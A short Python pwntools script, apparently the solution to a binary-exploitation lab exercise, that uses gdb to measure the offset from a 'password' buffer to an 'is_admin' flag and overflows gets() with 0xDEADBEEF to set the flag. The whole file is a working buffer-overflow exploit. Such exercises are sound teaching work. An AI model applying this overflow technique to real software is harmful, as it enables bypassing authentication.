#!/usr/bin/env python3
from pwn import *
import subprocess
import re

def get_offset() -> int:
    """
    Launch gdb, stop at the start of main, step past the prologue so $rbp exists,
    print &password and &is_admin, then compute the byte distance.
    """
    cmd = [
        "gdb", "-q", "-batch",                 # -batch = non-interactive; auto-quit after commands
        "-ex", "file ./bin/ex2",
        "-ex", "tbreak main",          # break at main, not _start
        "-ex", "run < /dev/null",      # run to main, don't block at gets()
        "-ex", "frame 0",
        "-ex", "nexti 2",                      # execute prologue so frame & locals are materialized
        "-ex", 'printf "&password = %p\\n", &password',
        "-ex", 'printf "&is_admin = %p\\n", &is_admin',
        "-ex", "quit",
    ]
    try:
        result = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=10
        )
    except subprocess.TimeoutExpired as e:
        raise RuntimeError("gdb timed out while computing the offset") from e

    out = result.stdout
    m_pwd = re.search(r"&password\s*=\s*(0x[0-9a-fA-F]+)", out)
    m_adm = re.search(r"&is_admin\s*=\s*(0x[0-9a-fA-F]+)", out)
    if not (m_pwd and m_adm):
        raise RuntimeError("Failed to parse addresses from gdb output:\n" + out)

    pwd_addr = int(m_pwd.group(1), 16)
    adm_addr = int(m_adm.group(1), 16)
    return adm_addr - pwd_addr

def main():
    context.clear(arch='amd64')                # pwntools context
    print("[*] Calculating offset with gdb...")
    offset = get_offset()
    print(f"[+] Offset password -> is_admin = {offset} bytes")

    # Build payload: padding + DEADBEEF (8 bytes, little-endian)
    payload = b"A" * offset + p64(0xDEADBEEF)

    print("[*] Launching target and sending payload...")
    p = process("./bin/ex2")
    # IMPORTANT: gets() needs a newline to return
    p.sendline(payload)

    # Try to read a bit of output, then give you the TTY
    try:
        data = p.recv(timeout=1)
        if data:
            print(data.decode(errors="ignore"), end="")
    except EOFError:
        pass


if __name__ == "__main__":
    main()

